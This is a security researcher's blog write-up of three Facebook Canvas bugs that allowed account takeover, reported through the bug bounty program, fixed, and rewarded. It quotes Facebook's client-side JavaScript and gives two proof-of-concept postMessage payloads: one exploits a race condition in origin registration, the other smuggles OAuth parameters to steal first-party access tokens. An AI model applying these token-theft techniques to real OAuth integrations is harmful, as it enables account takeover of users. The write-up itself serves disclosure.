---
id: 742
title: 'More secure Facebook Canvas Part 2: More Account Takeovers'
date: '2022-03-04T15:43:51+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=742'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Summary**

After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i’ll write about 3 more bugs found which lead to Facebook Account Takeover.

<figure class="wp-block-embed is-type-wp-embed is-provider-youssef-sammouda wp-block-embed-youssef-sammouda"><div class="wp-block-embed__wrapper">> [More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers](https://ysamm.com/?p=708)

<iframe class="wp-embedded-content" data-secret="8eE6StbDNx" frameborder="0" height="338" loading="lazy" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://ysamm.com/?p=708&embed=true#?secret=GOwq3AjWpH#?secret=8eE6StbDNx" style="position: absolute; visibility: hidden;" title="“More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers” — Youssef Sammouda" width="600"></iframe></div>**Bug 1: Race Condition Bug**

Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn’t ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the **PlatformAppController** module, **showDialog** function and more:

```javascript
window.addEventListener("message", function(a) {
        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
            xdArbiterAck: !0
        });
        else if (a.data.xdArbiterRegister) {
            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
...
__d("XdArbiter", ... {
...
register: function(a, b, d, e) {
                e = b != null && b !== "" ? b : h;
                c("Arbiter").inform("XdArbiter/register", {
                    origin: d


```

```javascript
__d("PlatformAppController",...  (function(a, b, c, d, e, f, g, h) {
...
        u = new(c("JSONRPC"))(function(a, b) {
            var d = b.origin || k;
            b = b.source;
            if (b == null) {
                var e = c("ge")(j);
                b = e.contentWindow
            }
            c("XdArbiter").send("FB_RPC:" + a, b, d)
        });
    c("Arbiter").subscribe("XdArbiter/register", function(a, b) {
        q && b.origin != k && new(c("AsyncRequest"))().setURI("/platform/app_owned_url_check/").setData({
            appid: q,
            url: b.origin
        }).setHandler(function(a) {
            a = a.getPayload();
            a.allowed && (k = b.origin)
        }).send()
    });

    function f(a, b, e) {
        var f, g = a.method;
        delete a.method;
        delete a.access_token;
        delete a.next;
        delete a.context;
        delete a.locale;
        a.display = "async";
        if (g == null || typeof g !== "string" || !/^[\w\-_.]+$/.test(g)) throw new Error("Malformed method name");
        Object.keys(a).forEach(function(b) {
            if (/[\s\x80-\x9f]/.test(b)) delete a[b];
            else if (/\./.test(b)) {
                var c = b.replace(/\./g, "_");
                Object.prototype.hasOwnProperty.call(a, c) && delete a[b]
            }
        });
        var h = (f = this.origin) != null ? f : k;
        typeof a.redirect_uri === "string" && new(c("URI"))(a.redirect_uri).getOrigin() === new(c("URI"))(this.origin).getOrigin() && (h = a.redirect_uri);
        a.redirect_uri = h;
        g == "apprequests" && (g = "app_requests", a.context = "canvas_app_requests");
        if (g == "pay") {
            f = a.action;
            (f === "purchaseitem" || f === "purchase_item") && r && r.usePaymentModules && (g = "payment_module", a.action = "payment_module");
            f === "purchaseiap" && r && r.iapUsePaymentModule && (g = "payment_module_iap", a.action = "payment_module_iap");
            f === "purchaseitem" || f === "purchase_item" || f === "purchaseiap" ? i[g] = !0 : r && r.useNewPayDialog && (f === "create_subscription" || f === "createsubscription" || f === "changesubscription" || f === "modifysubscription" || f === "cancelsubscription" || f === "reactivatesubscription" || f === "settlesubscription") ? (g = "payment_subscription", f === "create_subscription" && (a.action = "createsubscription")) : i[g] = !1
        }
        g == "fbpromotion" && (g = "payer_promotion", a.action = "payer_promotion");
        g === "stream_publish" && (g = "stream.publish");
        (g == "permissions.oauth" || g == "permissions.request" || g == "oauth") && (g = "oauth");
        g === "stream.publish" && (i[g] = !0);
        a = v(a, g);
        if (i[g]) {
            w(g, a, function(d) {
                d.error_code == 1340004 ? c("CurrentUser").getID() && c("CurrentUser").getID() != "0" ? b(d) : new(c("URI"))("/login.php").addQueryData("next", c("URI").getRequestURI().toString()).go() : g === "app_requests" && d.error_code == 1349146 ? x(g, a, b, d, h) : b(d)
            });
            return
        }
        f = new(c("URI"))("/fbml/ajax/dialog/" + g.replace(/\./g, "_")).setQueryData(a);
        f = new(c("AsyncRequest"))().setMethod("GET").setReadOnly(!0).setURI(f).setAbortHandler(function() {
            e(d("PlatformDialogClient").REQUEST_ABORTED_ERROR)
        });
        new(c("Dialog"))().setAsync(f).setModal(!0).setWideDialog(!0).show().setCloseHandler(b)
    }
   ...
    function x(a, b, c, d, e) {
        b.redirect_uri = e, w("oauth", b, function(f) {
            f.error ? c(d) : (b.redirect_uri = e, w(a, b, function(a) {
                c(a)
            }))
        })
    }
    u.local.setSize = b;
    u.local.getPageInfo = e;
    u.local.scrollTo = a;
    u.local.showDialog = f;
  ...
}), 98);
```

the function **f** (u.local.showDialog) receives the message from the iframe and would construct the request to be sent to the OAuth endpoint ( redirect_uri and additional parameters ), also it would make sure as we pointed out in the previous post that the “Origin” URL to be included in redirect_uri parameter in the request to the OAuth endpoint would be the same one used later as **targetOrigin** in the postMessage method to send a message to the iframe, meaning even if we can specify Origin as https://www.instagram.com and the app_id of the Instagram application and we get a valid access_token from the server response, the access_token won’t be delivered to the us since our iframe doesn’t have www.instagram.com origin. Well, a bypass to this security mechanism was found :  
  
In line 38, we can notice that there’s a check whatever Origin supplied ( this.origin ) is null, this check was added as a fix to a previous bug ( 2 ), this time if the Origin is null or undefined the application should use the value of variable “**k**“. The variable “**k**” is set automatically to the origin of the URL set in the game application settings ( iframe URL ), however its value can be changed later.   
  
In line 12, we can notice that there’s a listener for an “**XdArbiter/register**” Arbiter message , upon receiving a valid message, it would send a server request to the endpoint **/platform/app_owned_url_check/** with the parameters app_id ( the current app id / attacker app id ) and URL which the one we’re trying to set “**k**” to.

All Facebook applications have **fbconnect://success** as a valid redirect_uri, we can set “**k**” to that value by sending a register message, and the trick here is that we can send another register message while the application is still waiting for the response to the OAuth endpoint, and change “**k**” back to the attacker website. Now, notice in line 4, k would be chosen but “k” with the new value and not “fbconnect://success” which would allow us to get the first party access_token.

**Proof of Concept**

```javascript
window.parent.postMessage({xdArbiterRegister:true,origin:"fbconnect://success"},"*");} 
msg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","app_id":"APP_ID","client_id":"APP_ID","response_type":"token"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg }
window.parent.postMessage(fullmsg,"*")
setTimeout(function(){
    window.parent.postMessage({xdArbiterRegister:true,origin:"https://ysamm.com"},"*");} 
},1000);

```

**Fix**

Meta security team fixed this bug by introducing a lock mechanism ( variable “s” ) which would initially bet set to **false** but in case “**k**” was chosen in **showDialog** due to an empty Origin , “s” would be set to **true**. The state of this variable “s” would of course be added as a condition to change or not change “**k**” in **XdArbiter/register**. Also, finally they have decided to ensure that app_id sent to the OAuth endpoint could only be the current app_id and not one specified in the cross-window message.

**Bug 2: Bypasses to previous fix**

I won’t talk much about this bug, i only introduced bypasses to the app_id restriction and also a bypass to the previous fix of the lock mechanism. This bypass introduced a rare case which needs time accuracy and other conditions to be met in order to work. The security team mitigated these bypasses and done more hardening which unfortunately didn’t stop me from finding a third bug.

**Bug 3: Encrypted Parameters**

At this point, this line of code **(a.app_id = q, a.client_id = q);** was added to ensure that we can’t select other app_id than the current one. Of course, as you may notice in the previous blog post, the server side application has weird interpretation about parameters and that’s what i focused on. I found out that in case app_id and client_id were forced we can have two other parameters from the message sent which can be named as **app_id\[0\]** ( its value is an empty string ). Adding this parameter would revoke app_id and we would now get a message that no app_id was specified. I noticed the same behavior with redirect_uri which is carefully generated, in case we add another parameter called **redirect_uri\[0\]**, this would result in redirect_uri being revoked.

However, even with this server side behavior we can’t actually specify new values for app_id and redirect_uri , we can only revoke them. Likely, i found a new parameter called **encrypted_query_string**. This parameter would contain a set of other parameters and their values but in an encrypted format which can later be decrypted server-side. How would we generate the encrypted string with our desired app_id and redirect_uri? Well it’s simple as visiting https://facebook.com/dialog/oauth?app_id=APP_ID&amp;redirect_uri=REDIRECT_URI . Here you should notice that we’re requesting **facebook.com** domain and not **www.facebook.com**. A redirect to https://www.facebook.com/dialog/oauth?encrypted_query_string=**ENCODED_FORMAT** would be made.

Here for our attack to work, we specify APP_ID to the Instagram app_id and redirect_uri to a valid redirect_uri of the Instagram application.

**Proof of concept**

```javascript
msg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","app_id":"Random",
"client_id":"Random","app_id[0]":"","redirect_uri":"Random",
"redirect_uri[0]":"","response_type":"token",
"encrypted_query_string":"<strong>ENCODED_FORMAT</strong>"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin:"https://ysamm.com"}
window.parent.postMessage(fullmsg,"*")
```

Notice here that we set app_id, client_id and redirect_uri in the message even though their values are going to be replaced because we need to keep this order for the parameters in the request to the OAuth Endpoint.

**Fix**

This time, finally Meta decided to apply the obvious fix and limit the control we have over the OAuth request. A whitelist of allowed parameters was added and the application would filter out any other parameters, of course with app_id and client_id always set to the current app_id.

**Timeline**

1. Sep 23, 2021— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Sep 24, 2021— Acknowledged by Facebook  
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Sep 28, 2021— Fixed by Facebook  
    Oct 14, 2021 — $42000 bounty awarded by Facebook.
2. Oct 29, 2021— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Oct 29, 2021— Acknowledged by Facebook  
    Dec 10, 2021— Fixed by Facebook  
    Dec 22, 2021 — $12500 bounty awarded by Facebook.
3. Jan 10, 2022— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Jan 11, 2022— Acknowledged by Facebook  
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Jan 24, 2022— Fixed by Facebook  
    Mar 3, 2022— $43750 bounty awarded by Facebook.